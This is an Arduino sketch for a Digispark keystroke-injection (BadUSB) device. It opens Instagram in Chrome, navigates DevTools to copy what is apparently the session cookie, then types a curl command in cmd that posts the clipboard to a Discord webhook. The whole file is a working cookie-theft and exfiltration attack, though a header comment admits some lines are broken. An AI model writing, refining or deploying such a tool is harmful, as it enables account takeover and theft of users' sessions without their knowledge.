//THIS CODE DOESN'T WORK... LINES 29-31 HAS ISSUES ;)


#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.delay(3000); // Wait for OS to be ready

    // Open Chrome (Win + R -> chrome -> Enter)
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("chrome instagram.com");
    //DigiKeyboard.sendKeyStroke(KEY_ENTER);
    //DigiKeyboard.delay(2000);

    // Open Instagram
    //DigiKeyboard.print("instagram.com");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(4000);

    // Open DevTools (F12)
    DigiKeyboard.sendKeyStroke(KEY_I, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
   // DigiKeyboard.delay(1000);

    // Open Console (Ctrl + Shift + J)
    //DigiKeyboard.sendKeyStroke(KEY_J, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
    DigiKeyboard.delay(1000);

     DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter  
    DigiKeyboard.delay(500);

      // Press Tab 6 times
  for (int i = 0; i < 6; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(100);
  }

    DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter
  DigiKeyboard.delay(500);

    // Press Down Arrow 11 times
  for (int i = 0; i < 11; i++) {
    DigiKeyboard.sendKeyStroke(KEY_DOWN);
    DigiKeyboard.delay(100);
  }

     DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press Tab
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);  // Press Ctrl + C

    // Run JavaScript to copy session cookie
   // DigiKeyboard.print(F("copy(document.cookie);"));
   // DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Sending session cookie to webhooks
      // Open Run (Win + R)
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);

    // Open cmd
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    // Start curl command
    DigiKeyboard.print("curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"");

    // Paste clipboard content
    DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(500);

    // Close JSON and send request
    DigiKeyboard.print("\\\"}\" \"https://discord.com/api/webhooks/<YOUR_WEBHOOK_ID>\"");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}


void loop() {
    // Do nothing after execution
}
